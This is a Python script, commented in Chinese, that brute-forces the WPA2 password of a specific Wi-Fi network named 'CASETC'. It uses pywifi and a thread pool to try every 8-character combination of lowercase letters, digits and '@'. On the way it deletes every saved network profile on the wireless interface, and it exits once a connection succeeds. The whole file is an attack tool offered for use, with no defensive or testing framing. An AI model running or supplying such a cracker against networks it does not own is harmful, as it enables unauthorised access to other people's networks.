# coding:utf-8
import os
import time  #时间
import pywifi  #破解wifi
import string
import itertools as its

from pywifi import const  #引用一些定义
from asyncio.tasks import sleep
# from threading import Thread
import threadpool

start_time = time.time()
s = string.ascii_lowercase + "1234567890@"

class PoJie():
    def __init__(self, name, s, repeat):
        self.wif_name = name 
        self.pwd = its.product(s, repeat=repeat)
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
        self.iface.disconnect() #测试链接断开所有链接

        time.sleep(1) #休眠1秒

        #测试网卡是否属于断开状态，
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
            print("开始破解：")
            pool = threadpool.ThreadPool(20)
            requests = threadpool.makeRequests(self.test_start, self.pwd)
            [pool.putRequest(req) for req in requests]
            pool.wait()
            # for pwd in self.pwd:
            #     myStr = "".join(pwd)
                

    def test_start(self, myStr):
        try:
            myStr = "".join(myStr)
            if myStr.count(max(s, key=myStr.count)) > 3:
                return 
            bool1 = self.test_connect(myStr)
            if bool1:
                print("密码正确：",myStr)
                print("%d second \n" % (time.time() - start_time))
                os._exit(0)
            else:
                print("密码错误:" + myStr)
                
        except Exception as e:
            print("err: %s" % e)
            

    def test_connect(self, findStr):#测试链接

        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid = self.wif_name #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码

        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        time.sleep(1)
        
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True   
        else:
            isOK=False

        self.iface.disconnect() #断开
        time.sleep(1)

        #检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK

        
def main():
    repeat = 8 
    start=PoJie("CASETC", s, repeat)
    # print(start.test_connect("v9", "azqsx123"))
    start.readPassWord()
    
    print("%d second \n" % (time.time() - start_time))

if __name__ == '__main__':
    main()